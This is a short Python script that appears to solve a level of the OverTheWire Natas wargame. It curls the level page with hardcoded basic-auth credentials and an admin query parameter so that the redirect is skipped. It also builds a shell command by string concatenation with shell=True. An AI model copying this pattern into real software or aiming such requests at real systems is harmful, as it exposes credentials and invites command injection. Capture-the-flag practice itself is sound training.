import os
import subprocess

target = 'http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org/?revelio=admin'
command = 'curl '+target
output = subprocess.check_output(command, shell=True)
print output